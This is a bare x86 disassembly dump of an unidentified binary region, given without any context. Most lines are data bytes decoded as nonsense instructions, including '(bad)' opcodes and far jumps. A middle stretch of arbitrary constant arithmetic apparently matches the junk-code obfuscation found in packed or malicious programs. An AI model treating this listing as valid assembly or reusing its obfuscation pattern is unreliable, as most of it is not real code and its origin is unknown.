  40f8b5:	sbb    ebp,DWORD PTR [ecx-0x18]
  40f8b8:	out    0xa4,al
  40f8ba:	jmp    0x40f903
  40f8bc:	cmp    BYTE PTR [edx-0x78],bh
  40f8bf:	jl     0x40f927
  40f8c1:	sahf   
  40f8c2:	xor    al,0x4d
  40f8c4:	cmp    al,0x95
  40f8c6:	jecxz  0x40f8a9
  40f8c8:	add    DWORD PTR [ecx-0x55],0x145f0f46
  40f8cf:	scas   eax,DWORD PTR es:[edi]
  40f8d0:	in     al,0x4a
  40f8d2:	xor    bh,BYTE PTR [edx]
  40f8d4:	dec    ebp
  40f8d5:	adc    DWORD PTR [esi-0x9],ebp
  40f8d8:	mov    DWORD PTR [edi],ebp
  40f8da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8db:	add    bh,al
  40f8dd:	arpl   WORD PTR [edx+0x42],cx
  40f8e0:	ret    0xc3f7
  40f8e3:	mov    al,ds:0x4e44d95b
  40f8e8:	pop    ebx
  40f8e9:	jge    0x40f88f
  40f8eb:	inc    esi
  40f8ec:	fldcw  WORD PTR [edx+0x2a]
  40f8ef:	rol    DWORD PTR [ebx+0x22c73ef8],1
  40f8f5:	sbb    edi,esp
  40f8f7:	lods   eax,DWORD PTR ds:[esi]
  40f8f8:	push   0xac957ea9
  40f8fd:	push   ecx
  40f8fe:	sar    BYTE PTR [esi],1
  40f900:	inc    esi
  40f901:	xor    BYTE PTR [ebx],0xbe
  40f904:	sar    BYTE PTR [ecx+0x685f68d2],1
  40f90a:	shl    dh,0x7d
  40f90d:	push   0x5d
  40f90f:	xchg   ebp,eax
  40f910:	jecxz  0x40f8ae
  40f912:	icebp  
  40f913:	addr16 popa 
  40f915:	pop    ebp
  40f916:	xchg   esi,eax
  40f917:	mov    esi,0x794d922e
  40f91c:	pop    edx
  40f91d:	cmp    al,0x12
  40f91f:	add    ch,BYTE PTR [edx+ebx*2-0x4d]
  40f923:	stos   BYTE PTR es:[edi],al
  40f924:	and    al,0xd3
  40f926:	das    
  40f927:	mov    ah,0xb4
  40f929:	push   ebx
  40f92a:	pusha  
  40f92b:	jno    0x40f963
  40f92d:	jns    0x40f954
  40f92f:	xchg   ecx,eax
  40f930:	jo     0x40f8d3
  40f932:	imul   esi,DWORD PTR [ebx+0x5],0xffffffd4
  40f936:	lods   eax,DWORD PTR ds:[esi]
  40f937:	and    eax,0x64f5fa72
  40f93c:	nop
  40f93d:	jo     0x40f92f
  40f93f:	sar    DWORD PTR [esi+ecx*1+0x411fbc0a],cl
  40f946:	sub    dl,BYTE PTR [ebx-0x12f0f568]
  40f94c:	mov    esp,0xabce82ca
  40f951:	shr    BYTE PTR [esp+eax*1],cl
  40f954:	adc    ch,BYTE PTR [edi]
  40f956:	les    ebx,FWORD PTR [ebx+0x7c]
  40f959:	xor    al,0xfd
  40f95b:	(bad)  
  40f95c:	jns    0x40f96d
  40f95e:	push   ds
  40f95f:	fwait
  40f960:	xchg   esp,eax
  40f961:	push   DWORD PTR [ecx*8-0x768aac77]
  40f968:	mov    cl,0x39
  40f96a:	mov    edi,0xee44b3bc
  40f96f:	dec    ecx
  40f970:	mov    eax,DWORD PTR [edx+0x51bcdbbb]
  40f976:	std    
  40f977:	pop    ebx
  40f978:	outs   dx,DWORD PTR ds:[esi]
  40f979:	mov    ch,0xfd
  40f97b:	and    DWORD PTR [ebx],edx
  40f97d:	pop    edx
  40f97e:	cmp    esp,ebp
  40f980:	sbb    edi,ecx
  40f982:	inc    esp
  40f983:	shr    DWORD PTR [edi+0xa],1
  40f986:	jae    0x40f952
  40f988:	mov    eax,ds:0xb23fb867
  40f98d:	sbb    al,0x17
  40f98f:	rcl    BYTE PTR [ecx-0x22],cl
  40f992:	xor    al,0x32
  40f994:	push   0x41
  40f996:	js     0x40f9ba
  40f998:	ficomp WORD PTR [eax+0x2733e34b]
  40f99e:	repnz push ebp
  40f9a0:	pushf  
  40f9a1:	test   DWORD PTR [edi],ecx
  40f9a3:	test   BYTE PTR [edi+0x1383aade],al
  40f9a9:	xchg   ebx,eax
  40f9aa:	cmp    esp,DWORD PTR [edx+0x69c1921d]
  40f9b0:	jl     0x40f9b1
  40f9b2:	scas   eax,DWORD PTR es:[edi]
  40f9b3:	jne    0x40fa0f
  40f9b5:	ins    DWORD PTR es:[edi],dx
  40f9b6:	xor    ch,BYTE PTR [eax-0xbf64f11]
  40f9bc:	loop   0x40fa33
  40f9be:	xor    DWORD PTR [ebx-0x37],edi
  40f9c1:	xor    cl,0x98
  40f9c4:	scas   eax,DWORD PTR es:[edi]
  40f9c5:	push   esp
  40f9c6:	ror    BYTE PTR [edx+0x42b604b7],cl
  40f9cc:	sub    BYTE PTR [eax+0x52],cl
  40f9cf:	dec    ecx
  40f9d0:	push   edx
  40f9d1:	inc    edx
  40f9d2:	(bad)  [edx]
  40f9d4:	dec    edi
  40f9d5:	mov    ds:0xed83fd1c,eax
  40f9da:	push   0xffffff9c
  40f9dc:	test   al,0x51
  40f9de:	xor    ah,BYTE PTR [ebx-0x33]
  40f9e1:	and    DWORD PTR [ebx],ebp
  40f9e3:	shl    DWORD PTR ds:0xc3e,0x89
  40f9ea:	inc    ebp
  40f9eb:	test   al,0xc7
  40f9ed:	inc    ebp
  40f9ee:	in     al,dx
  40f9ef:	mov    ebp,0x59000066
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x42205c
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x5b57d670]
  40fc87:	jo     0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xc7181814
  40fc91:	jmp    0xb73c2ab9
  40fc96:	dec    eax
  40fc97:	mov    esi,0x54ce50d2
  40fc9c:	add    BYTE PTR [ecx],cl
  40fc9e:	lds    esp,FWORD PTR [edi-0x40]
  40fca1:	outs   dx,BYTE PTR ds:[esi]
  40fca2:	xchg   edi,eax
  40fca3:	adc    al,0x6
  40fca5:	ficom  DWORD PTR [edx-0x13]
  40fca8:	js     0x40fcd0
  40fcaa:	push   ebx
  40fcab:	jge    0x40fca3
  40fcad:	aad    0xa1
  40fcaf:	lahf   
  40fcb0:	jle    0x40fd02
  40fcb2:	add    eax,0x7b48f901
  40fcb7:	mov    ebx,gs
  40fcb9:	pushf  
  40fcba:	outs   dx,BYTE PTR ds:[esi]
  40fcbb:	inc    edi
  40fcbc:	add    eax,0xaaecd68e
  40fcc1:	outs   dx,BYTE PTR ds:[esi]
  40fcc2:	pushf  
  40fcc3:	cmp    al,0x15
  40fcc5:	jbe    0x40fd16
  40fcc7:	imul   esp,DWORD PTR [ebp-0x8],0x833b10d7
  40fcce:	push   esp
  40fccf:	repnz sub BYTE PTR gs:[edi-0xfe7416],cl
  40fcd7:	jg     0x40fc71
  40fcd9:	rcl    BYTE PTR [edi+0x553ebae1],1
  40fcdf:	pop    eax
  40fce0:	ds push esi
  40fce2:	iret   
  40fce3:	lds    ebx,FWORD PTR [ebx]
  40fce5:	mov    dh,0x7f
  40fce7:	mov    eax,ds:0x98551d5b
  40fcec:	xor    BYTE PTR gs:[ebx+ebp*1-0xd],ah
  40fcf1:	ror    DWORD PTR [ebx+eax*2],cl
  40fcf4:	adc    DWORD PTR [ebx-0x19],ecx
  40fcf7:	les    esp,FWORD PTR [ecx]
  40fcf9:	push   eax
  40fcfa:	jmp    0xa467:0xd666939a
  40fd01:	repz jl 0x40fcf0
  40fd04:	jle    0x40fd22
  40fd06:	xor    eax,0xf0b6b2f5
  40fd0b:	sub    al,0x73
  40fd0d:	lea    esp,[eax-0x4cce4956]
  40fd13:	push   esi
  40fd14:	scas   al,BYTE PTR es:[edi]
  40fd15:	cmc    
  40fd16:	xchg   edx,eax
  40fd17:	dec    ecx
  40fd18:	leave  
  40fd19:	lea    edx,[edx]
  40fd1b:	xor    esp,esp
  40fd1d:	imul   DWORD PTR [ebp-0x6e]
  40fd20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd21:	or     DWORD PTR [edi+esi*8+0x5a],esp
  40fd25:	pusha  
  40fd26:	push   0xffffffb4
  40fd28:	sti    
  40fd29:	into   
  40fd2a:	sub    ch,BYTE PTR [edi+0x6948c98]
  40fd30:	inc    esi
  40fd31:	mov    edi,0xf1818cd8
  40fd36:	xor    eax,0xa3357c6d
  40fd3b:	loope  0x40fcf5
  40fd3d:	jl     0x40fda2
  40fd3f:	ret    
  40fd40:	jmp    0x40fcd2
  40fd42:	sbb    dl,ah
  40fd44:	cmc    
  40fd45:	stos   BYTE PTR es:[edi],al
  40fd46:	iret   
  40fd47:	es push ds
  40fd49:	jns    0x40fced
  40fd4b:	aad    0xb8
  40fd4d:	neg    BYTE PTR [edi]
  40fd4f:	daa    
  40fd50:	(bad)  
  40fd51:	pop    esi
  40fd52:	addr16 inc eax
  40fd54:	jbe    0x40fd3e
  40fd56:	call   DWORD PTR [esi-0x7ba12367]
  40fd5c:	sub    bl,BYTE PTR [edi-0x55733469]
  40fd62:	ror    BYTE PTR [edx+0x2e5e98b4],0x1
  40fd69:	arpl   WORD PTR [eax-0x35],ax
  40fd6c:	mov    al,0x31
  40fd6e:	mov    esp,0xb824e5f1
  40fd73:	sar    DWORD PTR [eax-0x5e1b106c],1
  40fd79:	imul   ebp,DWORD PTR [edx+0xe],0x2a
  40fd7d:	(bad)  
  40fd7e:	mov    ds:0x245cdc70,al
  40fd83:	(bad)  
  40fd84:	mov    ebx,0x2603d22b
  40fd89:	push   ecx
  40fd8a:	cmp    al,0x76
  40fd8c:	popa   
  40fd8d:	and    al,0x8
  40fd8f:	cmp    eax,0xf231ed9a
  40fd94:	or     DWORD PTR [ebx+0x13ca6268],esp
  40fd9a:	iret   
  40fd9b:	push   esp
  40fd9c:	xchg   BYTE PTR [edi+0x1e2f413b],ah
  40fda2:	xchg   esp,eax
  40fda3:	test   eax,0x7155d88d
  40fda8:	mov    esp,0xa3ad864c
  40fdad:	retf   
  40fdae:	repnz fistp WORD PTR [eax-0x5f]
  40fdb3:	adc    eax,0xd2f1e6cd
  40fdb8:	jbe    0x40fd65
  40fdba:	or     al,BYTE PTR [ecx]
  40fdbc:	sbb    ah,BYTE PTR [ebx]
  40fdbe:	enter  0x566d,0xd5
  40fdc2:	mov    edi,0xc47fdf44
  40fdc7:	or     ch,al
  40fdc9:	mov    al,ds:0x19ddcb8
  40fdce:	jbe    0x40fdf5
  40fdd0:	das    
  40fdd1:	cmp    bh,BYTE PTR [eax+0xe780244]
  40fdd7:	pop    esi
  40fdd8:	mov    es,WORD PTR [edx-0x1c]
  40fddb:	jmp    0x40fd61
  40fddd:	lods   al,BYTE PTR ds:[esi]
  40fdde:	fiadd  WORD PTR [edi-0x6c56a424]
  40fde4:	jae    0x40fe27
  40fde6:	jo     0x40fde8
  40fde8:	jecxz  0x40fda2
  40fdea:	ins    BYTE PTR es:[edi],dx
  40fdeb:	xor    DWORD PTR [edx],ebx
  40fded:	xchg   esp,eax
  40fdee:	mov    ds:0x2ea434c,eax
  40fdf3:	rcr    BYTE PTR [edi-0x73],cl
  40fdf6:	ret    
  40fdf7:	stc    
  40fdf8:	(bad)  
  40fdfa:	addr16 mov edx,esp
  40fdfd:	lods   al,BYTE PTR ds:[esi]
  40fdfe:	cld    
  40fdff:	mov    WORD PTR [ebx],ds
  40fe01:	scas   eax,DWORD PTR es:[edi]
  40fe02:	adc    al,0x31
  40fe04:	icebp  
  40fe05:	mov    bh,0x8c
  40fe07:	repz mov ebp,0x94f6ef41
  40fe0d:	cmp    DWORD PTR [eax-0xb],esi
  40fe10:	pop    ds
  40fe11:	sahf   
  40fe12:	sub    DWORD PTR [ebp+0x5d],ebp
  40fe15:	adc    bh,cl
  40fe17:	ret    
  40fe18:	ins    BYTE PTR es:[edi],dx
  40fe19:	stos   BYTE PTR es:[edi],al
  40fe1a:	mov    ds:0xca4d1e9b,al
  40fe1f:	in     al,dx
  40fe20:	xor    eax,esi
  40fe22:	mov    ah,0x1b
  40fe24:	aaa    
  40fe25:	out    0x31,eax
  40fe27:	pop    ebx
  40fe28:	icebp  
  40fe29:	xchg   ecx,eax
  40fe2a:	cmp    DWORD PTR [esi+0x32599689],0x11fd5f1d
  40fe34:	cs pop edx
  40fe36:	(bad)  
  40fe37:	aaa    
  40fe38:	pop    ss
  40fe39:	out    dx,al
  40fe3a:	inc    ebx
  40fe3b:	mov    ah,BYTE PTR [esi-0x590967e8]
  40fe41:	neg    DWORD PTR [edi+0x6cec06b8]
  40fe47:	xchg   esi,eax
  40fe48:	mov    esi,0xd3ee4914
  40fe4d:	call   0x1f00:0x3487fa06
  40fe54:	or     BYTE PTR [eax-0x23],dh
  40fe57:	mov    ebp,0x16de8fbf
  40fe5c:	cmc    
  40fe5d:	repz dec edx
  40fe5f:	popa   
  40fe60:	sub    edi,DWORD PTR [esi+0x70]
  40fe63:	fcmovnu st,st(0)
  40fe65:	dec    esi
  40fe66:	mov    edx,0xe075efc7
  40fe6b:	nop
  40fe6c:	test   BYTE PTR [eax-0x211970e5],dl
  40fe72:	cmp    dh,BYTE PTR [esi]
  40fe74:	test   BYTE PTR [ebx+0x70021ac7],ah
  40fe7a:	push   ecx
  40fe7b:	ret    0xd686
  40fe7e:	das    
  40fe7f:	(bad)  [eax+0x1b2b6b9]
  40fe85:	xchg   edi,eax
  40fe86:	mov    fs,WORD PTR ds:0x6d1002e2
  40fe8c:	mov    DWORD PTR [edi+0x18566065],esp
  40fe92:	aaa    
  40fe93:	ds sub al,dh
  40fe96:	sub    al,0x3e
  40fe98:	or     BYTE PTR [edi+0x45],ah
  40fe9b:	mov    ?,WORD PTR [ebx+edi*1-0x25cefad5]
  40fea2:	add    eax,0xd9cda415
  40fea7:	and    ch,BYTE PTR [eax+0x17]
  40feaa:	popa   
  40feab:	dec    edx
  40feac:	pop    edi
  40fead:	stos   BYTE PTR es:[edi],al
  40feae:	dec    esi
  40feaf:	dec    edi
  40feb0:	jp     0x40fea8
  40feb2:	and    dl,BYTE PTR [eax-0x6043c399]
  40feb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feb9:	and    DWORD PTR [edi+edx*4+0x11],esi
  40febd:	xchg   ecx,eax
  40febe:	or     BYTE PTR [ebp+0x34689f22],0x57
  40fec5:	dec    edi
  40fec6:	clc    
  40fec7:	cld    
  40fec8:	imul   ebx,DWORD PTR [esi+0x4db70f6b],0xffffffaf
  40fecf:	mov    ebp,0x3d907dc6
  40fed4:	loop   0x40fe9e
  40fed6:	cmp    ch,dl
  40fed8:	pop    edi
  40fed9:	pop    ebx
  40feda:	inc    ebp
  40fedb:	out    0x1,eax
  40fedd:	push   esp
  40fede:	adc    dh,BYTE PTR [edi+0x52]
  40fee1:	je     0x40ff49
  40fee3:	dec    ebx
  40fee4:	xchg   edx,eax
  40fee5:	lods   al,BYTE PTR ds:[esi]
  40fee6:	mov    edi,ebp
  40fee8:	nop
  40fee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feea:	aad    0x85
  40feec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feed:	(bad)  
  40feee:	int    0x28
  40fef0:	mov    edx,0x27e9c0af
  40fef5:	sar    DWORD PTR ds:0xfc46d979,cl
  40fefb:	hlt    
  40fefc:	mov    ebp,0x90425599
  40ff01:	pop    ax
  40ff03:	ja     0x40ff3f
  40ff05:	mov    bh,0x41
  40ff07:	cli    
  40ff08:	mov    al,0xcf
  40ff0a:	cmp    BYTE PTR [eax+eiz*4],ah
  40ff0d:	sub    eax,0x809cf28
  40ff12:	pop    ss
  40ff13:	xchg   ebx,eax
  40ff14:	mul    eax
  40ff16:	loop   0x40fea5
  40ff18:	xor    edx,DWORD PTR [eax+0x11]
  40ff1b:	rcl    BYTE PTR [ecx+0x55],0xfc
  40ff1f:	clc    
  40ff20:	adc    esi,edx
  40ff22:	jp     0x40ff89
  40ff24:	mov    eax,ds:0xe639e87a
  40ff29:	or     BYTE PTR [ecx-0x61ad338f],al
  40ff2f:	fwait
  40ff30:	add    dh,BYTE PTR [edx+eax*4-0x172648cb]
  40ff37:	or     ebp,esi
  40ff39:	and    eax,0x3c3061a7
  40ff3e:	shl    BYTE PTR [edi+ebp*1+0x390105],1
  40ff45:	add    BYTE PTR ds:0x40c2,dh
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x467c73b9]
  40ff68:	and    DWORD PTR [ecx+0x7c],edi
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    BYTE PTR [esi],al
  40ff74:	aas    
  40ff75:	mov    ebx,esi
  40ff77:	jmp    0xbd2a:0x72c0ace4
  40ff7e:	mov    bl,0xfa
  40ff80:	adc    BYTE PTR [ebp+0x154608ca],0x83
  40ff87:	and    esp,ebx
  40ff89:	iret   
  40ff8a:	jmp    DWORD PTR [edx]
  40ff8c:	sahf   
  40ff8d:	mov    eax,0x34e36321
  40ff92:	shr    BYTE PTR [edx+ebx*2],cl
  40ff95:	sahf   
  40ff96:	sub    al,0x92
  40ff98:	iret   
  40ff99:	in     eax,dx
  40ff9a:	test   eax,0xddaba5b2
  40ff9f:	popa   
  40ffa0:	xor    al,0x5e
  40ffa2:	cs add esp,esi
  40ffa5:	(bad)  
  40ffa6:	or     BYTE PTR ds:0xa5cc9de6,dh
  40ffac:	mov    al,ds:0x57551315
  40ffb1:	and    dl,BYTE PTR [esi-0x57]
  40ffb4:	sbb    bl,BYTE PTR [edi]
  40ffb6:	mov    ebx,0xbcaae47e
  40ffbb:	cwde   
  40ffbc:	in     eax,0x82
  40ffbe:	cmpxchg BYTE PTR [edi+ebp*8+0x764b10f6],ah
  40ffc6:	add    DWORD PTR [ecx+0x3f96eef],ebx
  40ffcc:	clc    
  40ffcd:	ins    DWORD PTR es:[edi],dx
  40ffce:	lods   eax,DWORD PTR ds:[esi]
  40ffcf:	out    dx,al
  40ffd0:	loop   0x40ffb7
  40ffd2:	(bad)  
  40ffd3:	out    0x59,al
  40ffd5:	stos   BYTE PTR es:[edi],al
  40ffd6:	and    bh,bh
  40ffd8:	mov    ds:0x5df0e2f1,al
  40ffdd:	out    0x9e,eax
  40ffdf:	pop    ss
  40ffe0:	dec    ecx
  40ffe1:	pop    ebp
  40ffe2:	or     eax,0xb8cfb3f4
  40ffe7:	mov    ebx,0x321d08d1
  40ffec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffed:	mov    esp,0x271de50c
  40fff2:	clc    
  40fff3:	and    bh,BYTE PTR [edx]
  40fff5:	cmp    al,0x7
  40fff7:	mov    esi,0x7c1f4574
  40fffc:	xchg   edi,eax
  40fffd:	int3   
  40fffe:	dec    esi
  40ffff:	jb     0x40ff98
  410001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410002:	add    DWORD PTR ds:0xb0934cf3,eax
  410008:	inc    ebp
  410009:	mov    ebx,ds
  41000b:	cmp    ch,cl
  41000d:	clc    
  41000e:	sub    eax,0x471dfe0b
  410013:	sar    BYTE PTR [edi+0x7f],cl
  410016:	loop   0x40fffe
  410018:	xchg   esp,eax
  410019:	mov    ecx,0x5a26390a
  41001e:	(bad)  
  41001f:	stos   BYTE PTR es:[edi],al
  410020:	fcomp  DWORD PTR gs:[ebp-0x40]
  410024:	rcl    BYTE PTR [esi+0x6e],0x65
  410028:	pop    eax
  410029:	cmp    ah,BYTE PTR [ebx-0x6d]
  41002c:	sub    cl,al
  41002e:	outs   dx,BYTE PTR ds:[esi]
  41002f:	jbe    0x40ffba
  410031:	push   eax
  410032:	fwait
  410033:	sub    eax,0xe63d8b23
  410038:	push   esp
  410039:	mov    esi,0xc456478f
  41003e:	repnz cmp BYTE PTR [ebp-0x1f8388b5],dh
  410045:	ins    DWORD PTR es:[edi],dx
  410046:	push   ebx
  410047:	mov    edx,0x58bd0601
  41004c:	jl     0x410055
  41004e:	mov    ch,0xbc
  410050:	or     al,0x46
  410052:	loope  0x410086
  410054:	pop    eax
  410055:	loope  0x410089
  410057:	push   ecx
  410058:	bound  esp,QWORD PTR [ebp+0x489e1ff0]
  41005e:	add    ah,dh
  410060:	pop    esp
  410061:	push   edx
  410062:	stos   DWORD PTR es:[edi],eax
  410063:	mov    dh,0x68
  410065:	dec    edi
  410066:	in     eax,dx
  410067:	inc    esi
  410068:	mov    ecx,0x32af2ff3
  41006d:	mov    BYTE PTR [esi+0x4806e87c],cl
  410073:	ficomp DWORD PTR [edx-0x1be6a57d]
  410079:	and    DWORD PTR [edx+0x14],ecx
  41007c:	mov    bh,0x85
  41007e:	lahf   
  41007f:	push   eax
  410080:	cld    
  410081:	bound  ecx,QWORD PTR [edx-0x66c7e2d3]
  410087:	in     al,0x2e
  410089:	dec    ebx
  41008a:	imul   esi,DWORD PTR [esi+0x38],0xffffffb2
  41008e:	pop    ebx
  41008f:	fist   WORD PTR [eax+0x6d]
  410092:	cs pop eax
  410094:	mov    ecx,0x4b3f6e44
  410099:	call   0xa6f6:0x59c72a78
  4100a0:	retf   
  4100a1:	fucomp st(6)
  4100a3:	cld    
  4100a4:	popa   
  4100a5:	scas   eax,DWORD PTR es:[edi]
  4100a6:	int3   
  4100a7:	add    al,0xcf
  4100a9:	je     0x410107
  4100ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ac:	xchg   edi,eax
  4100ad:	retf   
  4100ae:	pop    edi
  4100af:	mov    eax,0xda6973ce
  4100b4:	or     DWORD PTR [esi-0x27fb4d52],eax
  4100ba:	and    eax,0x58d23e62
  4100bf:	push   0x2
  4100c1:	dec    edi
  4100c2:	repnz adc DWORD PTR [ebx+0x3fa5edf4],esi
  4100c9:	pop    edi
  4100ca:	mov    ah,0x1e
  4100cc:	cmp    DWORD PTR [edx+0x4f],eax
